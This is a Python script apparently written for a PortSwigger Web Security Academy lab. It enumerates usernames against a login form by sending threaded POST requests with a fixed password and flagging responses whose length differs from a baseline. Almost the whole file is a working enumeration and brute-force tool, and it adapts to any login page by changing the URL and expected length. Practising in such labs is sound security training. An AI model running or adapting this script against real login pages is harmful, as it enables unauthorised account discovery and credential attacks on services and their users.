import requests
import threading

def make_request(username, password):
    url = "https://0aaa009a03d6133f88762a5900bc0053.web-security-academy.net/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://0aaa009a03d6133f88762a5900bc0053.web-security-academy.net",
        "Referer": "https://0aaa009a03d6133f88762a5900bc0053.web-security-academy.net/login",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
        "Te": "trailers",
    }
    data = {
        "username": username,
        "password": password
    }

    for _ in range(5):
        try:
            response = requests.post(url, headers=headers, data=data, timeout=20)  # Set timeout to 10 seconds
            if len(response.content) != 3132:  # Adjust response content length as needed
                print(f"Username: {username}")
                print(len(response.content))
                print(response.content)
        except Exception as e:
            print(f"Error occurred for username {username}: {str(e)}")

if __name__ == "__main__":
    usernames = []
    with open("list.txt", "r") as f:
        usernames = [line.strip() for line in f.readlines()]

    threads = []
    for username in usernames:
        password = "senha"  # Assuming the password is fixed as "senha"
        thread = threading.Thread(target=make_request, args=(username, password))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()
